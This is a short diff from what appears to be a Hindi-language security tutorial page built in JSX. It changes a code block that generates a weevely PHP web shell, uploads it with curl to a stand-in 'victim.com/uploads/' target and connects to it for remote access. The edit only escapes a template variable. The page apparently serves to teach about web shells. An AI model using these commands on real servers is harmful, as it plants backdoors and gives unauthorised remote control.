@@ -719,7 +719,7 @@ TARGET="http://victim.com/uploads/"
 
 weevely generate $PASSWORD $OUTPUT
 curl -F "file=@$OUTPUT" $TARGET
-weevely ${TARGET}shell.php $PASSWORD`}
+weevely \${TARGET}shell.php $PASSWORD`}
       />
       <CodeBlock
         title="कस्टम मॉड्यूल बनाना"
